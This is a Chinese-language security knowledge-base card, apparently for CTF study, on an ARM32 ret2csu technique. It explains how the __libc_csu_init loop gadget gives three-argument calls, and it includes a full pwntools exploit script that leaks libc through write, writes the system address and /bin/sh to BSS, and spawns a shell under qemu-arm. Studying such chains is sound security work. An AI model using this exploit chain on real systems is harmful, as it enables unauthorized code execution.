---
id: binary-pwn-rop-arm32-ret2csu-csu-init-loop-gadget
title: ARM32 ret2csu：__libc_csu_init 的 mov r2,sb/mov r1,r8/mov r0,r7 + blx r3 循环 gadget，连续三参调用 write/read/system
type: scenario
domain: binary
path: binary/pwn/rop
technique: arm32-ret2csu-csu-init-loop-gadget
tags:
- pwn
- arm
- arm32
- ret2csu
- rop
- ret2libc
- gadget
- qemu
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V697
  verified_at: '2026-11-13T18:22:56+08:00'
  notes: 已对照原文全文与 13 图核对：img10 确认 0x104E0 循环段（mov r2,sb; mov r1,r8; mov r0,r7; ldr r3,[r5],#4; add r4,#1; blx r3; cmp r6,r4; bne 0x104E0）与 0x10500 pop {r4-r10,pc} 地址、寄存器序（r7/r8/sb->r0/r1/r2）与卡内一致；img01 x64 checksec、img02 溢出偏移 136、img03/04 x64 csu 两段与栈帧、img05 三段 exp、img06/07/08 x86-32 csu 栈传参不可控、img09 ARM 寄存器表、img11 ARM 栈、img12/13 AArch64 寄存器与栈结构均属实。核对原文 exp：第一段 flat 在 pop 后 pc 又填 0x10500（连续两次 pop），write 泄露轮被跳过，脚本 r(4) 与链内 read(0,bss,0x10) 互等；原文后段还有 ru('input:') 等不到提示的死代码。已修正卡内该处说明（原写'等 byebye 后再发 system 会互等'不准确），卡内单 pop 进循环、先收 4 字节泄露再发 system 的分阶段 PoC 与 gadget 语义相符，可复现（12 字节短读即可满足 read(0,bss,0x10)）。dedup 唯一 likely_duplicate 候选 binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3 经核对为 SimpleDecoder 两段式 pop{r4-r10,pc}+pop{r3,pc}+mov r0,r7;blx r3 单参组合，与本卡 __libc_csu_init 三参循环 gadget（不同二进制/形态/调用能力）非同链，dedup_review 成立，两卡并列；dup-scan.json 无涉及本卡 pair。skipped 草稿核对属实：x64 demo 与已验证 binary-pwn-rop-ret2csu-write-got-leak-ret2libc 同链、SimpleDecoder 草稿与已验证 composed-gadget 卡同链，两份 draft 均在 ingest/rejected/drafts/。原文无组件版本，未设
    affected_versions。未验证点：PoC 未本机 qemu 复跑，溢出偏移 12 与地址需按目标编译产物确认（卡内已注明）。
url: /docs/binary/pwn/rop/binary-pwn-rop-arm32-ret2csu-csu-init-loop-gadget/
draft: false
kb_aliases:
- ARM32 ret2csu
- ARM __libc_csu_init
- mov r2, sb ; mov r1, r8 ; mov r0, r7
- ldr r3, [r5],
- pop {r4-r10, pc}
- qemu-arm ret2csu
---

## 一句话结论

ARM32 没有 x86 式 `pop rdi/rsi/rdx; ret` 的直控 gadget，但动态链接的非 PIE ARM32 程序在 `__libc_csu_init` 末尾常带一段 `mov r2, sb; mov r1, r8; mov r0, r7; ldr r3, [r5], #4; add r4, r4, #1; blx r3; cmp r6, r4; bne ...; pop {r4-r10, pc}` 循环调用段：先用入口 `pop {r4-r10, pc}` 一次性设置 r4–r10 与 pc，即可把 r7/r8/sb 当作 r0/r1/r2、把 `[r5]` 当作函数指针完成任意三参调用；尾部的 `pop {r4-r10, pc}` 又为下一次调用装填寄存器，于是同一条链可连续执行 `write(1, read@got, 4)` 泄 libc → `read(0, bss, 0x10)` 把 system 指针与 `/bin/sh` 写进 BSS → `system(bss+4)` 拿 shell（原文 ARM32 ret2libc 示例，qemu-arm 环境）。

## 原理

- **ARM32 传参/返回**：r0–r3 依次是前四个参数，r4–r11 为 callee-saved，r12=ip，r13=sp，r14=lr（返回地址），r15=pc。栈溢出覆盖保存的 lr 即可控 pc；但没有直接 `pop {r0,r1,r2,pc}` 的 gadget 时，无法按 x86 习惯直接给三参函数供参。
- **csu 循环段语义**（本例 `__libc_csu_init` 内 0x104E0，原文反汇编截图确认）：
  ```asm
  loc_104E0:
    mov r2, sb        ; r9  -> 第 3 个参数
    mov r1, r8        ; r8  -> 第 2 个参数
    mov r0, r7        ; r7  -> 第 1 个参数
    ldr r3, [r5], #4  ; r3 = *r5; r5 += 4（从指针表取函数地址并自增）
    add r4, r4, #1
    blx r3            ; 调用 r3（写 lr，返回后继续）
    cmp r6, r4
    bne loc_104E0     ; r6 == r4 时不循环
    pop {r4, r5, r6, r7, r8, sb, sl, pc}
  ```
  函数指针必须放在可读内存（GOT/BSS）里、由 `r5` 指向；`blx` 会写 lr，因此函数返回后继续执行 `cmp/pop`，链不会断。
- **入口与自续**：`0x10500` 是 `pop {r4, r5, r6, r7, r8, sb, sl, pc}`。第一次调用前用一段栈数据把 r4–r10 与 pc 设好（pc=0x104E0）；此后每次 `blx` 返回后的 `pop` 都从栈上取 8 个字，既决定本轮是否继续循环（r6 与 r4+1 比较，令 r6=r4+1 即调用一次），又直接装填下一轮调用的 r4–r10/pc，所以一次栈溢出就能编码出一串“调用表”。
- **三参调用示例**：`write(1, read@got, 4)` → r7=1、r8=read@got、sb=4、r5=write@got（`[r5]` 为 write 真实地址）；`read(0, bss, 0x10)` → r7=0、r8=bss、sb=0x10、r5=read@got；`system(bss+4)` → 先把 system 真实地址与 `/bin/sh` 通过 read 写进 BSS，再令 r5=bss、r7=bss+4。
- **为什么 32 位 x86 不行、ARM32 却行**：x86-32 的 `__libc_csu_init` 用栈传前两个参数（`push [esp+arg_0]`/`push [esp+arg_4]`），调用目标也从 `[ebp+esi*4-0x100]` 取，溢出只能控返回链、控不到这些参数槽；ARM32 的这段 csu 则把 callee-saved 寄存器（r7/r8/r9）搬进 r0/r1/r2，寄存器可由 `pop` 直接控制，所以等价于一个可循环的三参调用器。
- **前提与限制**：二进制需带这段 csu（动态链接、非 PIE、未 strip 时常见；静态/裁剪构建可能没有），目标 libc 版本已知（泄漏后算 system），并且有二次读入把 system/`/bin/sh` 写进可写内存。qemu-arm 下运行/调试（`qemu-arm -L <cross-root> ./pwn`，调试加 `-g 1234` + `gdb-multiarch`）。

## 触发条件

- ARM32（arm-32-little）ELF，存在可覆盖 lr 的栈溢出（本题 `buf[3]` 12 字节 vs `read(...,256)`）。
- 二进制含 `__libc_csu_init` 循环段及其尾部 `pop {r4-r10, pc}`（或等价的可控多寄存器 pop + `mov r0/r1/r2` + `blx` 组合）。
- GOT 中有可调用的输出/读入函数（write/read/puts 等），且可通过 `r5` 指针表间接调用。
- 可经 read/其它写原语把 `system` 真实地址与 `/bin/sh` 写入 BSS（或 libc 中已有可用字符串）。
- 本地用 qemu-arm + 交叉 libc 复现；远程需对应 libc 版本。

## 利用步骤

1. `file`/`checksec` 确认 arm-32-little、动态链接、NX、非 PIE；`qemu-arm -L /usr/arm-linux-gnueabi/ ./pwn` 运行，调试时 `qemu-arm -g 1234 -L ... ./pwn` + `gdb-multiarch`（`set architecture arm`、`target remote :1234`）。
2. 逆向下确认溢出偏移（buf 12 字节 + 保存的 fp/lr，按编译产物确认到 lr 的准确偏移）与 `__libc_csu_init` 地址：入口 pop 段（0x10500）与循环调用段（0x104E0）。
3. 找可写 BSS；`ROPgadget` 辅助确认无直控 r0 的 pop gadget，从而确定必须使用 csu。
4. 第一段链：溢出 + `pop {r4-r10,pc}` + `[r4=0, r5=write@got, r6=1, r7=1, r8=read@got, sb=4, sl=0, pc=loop]`，执行 `write(1, read@got, 4)`；循环段尾部 pop 的 8 个字顺带装填下一轮 `read(0, bss, 0x10)`（r5=read@got、r7=0、r8=bss、sb=0x10、pc=loop）。
5. 收到 4 字节 read 真实地址后算 libc 基址与 system；read 正在等待输入，立即发送 `p32(system) + "/bin/sh\\x00"`，写入 BSS。
6. 循环段尾 pop 装入 `system(bss+4)` 的寄存器（r5=bss，`[bss]=system`、r7=bss+4），随后 `blx system` 得 shell。
7. 若链在 system 返回后继续弹栈导致崩溃，可在末尾补一段 `pop {r4-r10,pc}` 数据返回漏洞函数维持交互。

## PoC

```python
from pwn import *
context(arch='arm', os='linux', log_level='debug')
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './pwn'])
elf = ELF('./pwn'); libc = ELF('/usr/arm-linux-gnueabi/lib/libc.so.6')

pop_all = 0x00010500      # pop {r4, r5, r6, r7, r8, sb, sl, pc}
loop    = 0x000104E0      # mov r2,sb; mov r1,r8; mov r0,r7; ldr r3,[r5],#4; ...; blx r3; cmp; pop {...}
write_got = elf.got['write']; read_got = elf.got['read']
bss = elf.bss() + 0x100
OFFSET = 12               # 以目标编译产物为准（buf 12 字节，其后是保存的 fp/lr）

def stage(r4, r5, r6, r7, r8, sb, pc):
    return flat(r4, r5, r6, r7, r8, sb, 0, pc)   # 8 字：pop 顺序 r4,r5,r6,r7,r8,sb,sl,pc

pl  = b'a' * OFFSET + p32(pop_all)
pl += stage(0, write_got, 1, 1, read_got, 4, loop)      # write(1, read@got, 4)，尾 pop 装填下一轮
pl += stage(0, read_got, 1, 0, bss, 0x10, loop)         # read(0, bss, 0x10)，尾 pop 装填下一轮
pl += stage(0, bss, 1, bss + 4, 0, 0, loop)             # system(bss+4)，[bss]=system
pl += stage(0, 0, 0, 0, 0, 0, elf.symbols.get('dofunc', 0))  # system 返回后的兜底

p.sendafter(b'input:', pl)
read_real = u32(p.recv(4))
libcbase = read_real - libc.sym['read']
p.send(p32(libcbase + libc.sym['system']) + b'/bin/sh\x00')  # 喂给链内 read(0,bss,0x10)
p.interactive()
```

```text
# 预期：先收到 read 的 4 字节真实地址；发送 system+/bin/sh 后进入 shell。
# 注：原文 exp 第一段在 pop 后把 pc 又填成 0x10500（连续两次 pop），write 泄露轮因此被跳过，
#     脚本端 r(4) 等 4 字节泄露、链内 read(0,bss,0x10) 等输入，形成互等卡死；本卡 PoC 改为
#     单个 pop 后直接进 0x104E0 循环，并按“先收 4 字节泄露→立即发送 system+/bin/sh
#     （12 字节即可，read(0,bss,0x10) 短读返回）→interactive”复现；偏移/地址按目标重算。
```

## 变体与关联

- 变体：GOT 中无 write 时可用 puts/printf 等输出函数泄漏；无 read 时用 `scanf` 或已有输入点二次写 BSS。
- 变体：把 `ldr r3,[r5],#4` 的指针表布置成 BSS 中的函数指针数组，可连续调用多个函数（链式 gadget 表）。
- 关联：[[binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3]]（另一种 ARM32 组合：`pop {r4-r10,pc}` + `pop {r3,pc}` + `mov r0,r7; blx r3`，只支持单参调用）；[[binary-pwn-rop-aarch64-ret2csu-register-mapping-ret2libc]]（AArch64 的 csu 装载/调用段与寄存器映射）；[[binary-pwn-rop-ret2csu-write-got-leak-ret2libc]]（x86-64 两段 csu 的同类思路）。
- 边界：x86-32 的 csu 用栈传参、参数槽不可控，不能套用本方法；静态链接/裁剪二进制可能没有该 csu 段，需另找等价的 `mov r0/r1/r2; blx` 组合；PIE 会随机化 gadget 地址。

## 检测与防御

- 出题/加固：开启 PIE；使用静态链接或裁剪掉 csu 段并不能根治，应消除栈溢出与可控 lr；开启 NX/栈保护。
- 防御：控制流完整性（ARMv8.5 BTI）可提高 `blx <reg>` 间接调用劫持门槛；不要在可写数据中保存可调用的函数指针表。
- 检测（CTF/研究环境）：崩溃栈出现 `pop {r4-r10,pc}`（0x10500 一类）与 csu 循环段地址、`blx` 目标落在 GOT 函数上、随后 BSS 被写入 libc 地址；qemu 日志中出现连续 `blx` 调用。
